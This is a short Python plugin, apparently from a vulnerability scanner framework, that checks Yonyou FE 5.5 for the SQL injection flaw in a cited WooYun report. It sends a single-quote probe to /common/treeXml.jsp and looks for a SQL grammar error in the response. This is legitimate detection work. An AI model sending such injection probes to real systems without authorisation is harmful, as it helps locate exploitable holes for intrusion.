#!/usr/bin/env python
# -*- coding: utf-8 -*-
# FE5.5
# http://www.wooyun.org/bugs/wooyun-2010-086697
def assign(service, arg):
    if service == "yongyou_fe":
        return True, arg

def audit(arg):
    url = arg + '/common/treeXml.jsp?type=sort&lx=3&code=1%27'
    _, head, body, _, _ = curl.curl(url)
    if body and body.find('bad SQL grammar [];') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_fe', 'http://www.example.com/')[1])